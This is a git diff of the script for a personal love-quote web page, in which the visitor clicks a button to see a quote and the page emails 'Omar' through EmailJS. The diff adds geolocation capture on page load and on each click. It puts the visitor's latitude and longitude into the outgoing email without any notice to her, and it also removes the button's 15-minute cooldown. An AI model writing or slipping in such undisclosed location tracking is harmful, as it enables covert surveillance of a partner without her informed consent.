@@ -1,4 +1,7 @@
-console.log("Pushed3");
+var lati_long;
+var deny;
+getLocation()
+console.log("Pushed4");
 const quotes = [
 'Love You so much My sweety Strawberry.❤️"',
 'You are the light that guides me through life\'s darkest moments.❤️"',
@@ -135,7 +138,6 @@ const userName = [
 ]
 
 let number = document.querySelector("#number")
-
 let daysList = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
 var currentdate = new Date(); 
 var day = daysList[currentdate.getDay()];
@@ -152,7 +154,24 @@ window.onload = function() {
     document.querySelector("#password").focus()
 }
 
+//Get User Location
+function getLocation() {
+    if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, showError);
+}
+}
+function showPosition(position) {
+    lati_long = "Latitude: " + position.coords.latitude + " | " + "Longitude: " + position.coords.longitude;
+}
+function showError(error) {
+    if (error.PERMISSION_DENIED) {
+        deny = "Navigator blocked (Denied)"
+    }
+}
+
+
 function printQuote() {
+    getLocation()
     let randomNumber = Math.floor(Math.random() * quotes.length);
     let randomName = Math.floor(Math.random() * userName.length);
     var message = userName[randomName] + quotes[randomNumber];
@@ -169,9 +188,10 @@ function printQuote() {
     emailjs.send("service_2tbrcks","template_0v18a3s",{
     to_name: "Omar",
     from_name: "Maynory",
-    message: "I Love You 3omry",
+    message: "I Love You ya 3omry",
     date: `I Clicked on the button on >> ${datetime}`,
     qoute: `Qoute Number (${number}) is:  ${message}`,
+    latilong: lati_long,
     });
 }
 
@@ -186,7 +206,7 @@ if (disabledTime && currentTime < disabledTime) {
 } 
 myButton.addEventListener("click", function(e) { 
     myButton.disabled = true; 
-    let disableDuration = 900 * 1000; // 900 seconds = 15 Mins //////////////////////////////////////////
+    let disableDuration = 0 * 1000; // 900 seconds = 15 Mins //////////////////////////////////////////
     let disabledTime = new Date().getTime() + disableDuration; 
     localStorage.setItem("disabledTime", disabledTime); 
     
@@ -209,6 +229,10 @@ const theme = event.target.value;
 document.body.className = theme;
 
 });
+
+
+
+
 
 
 // Password Checker
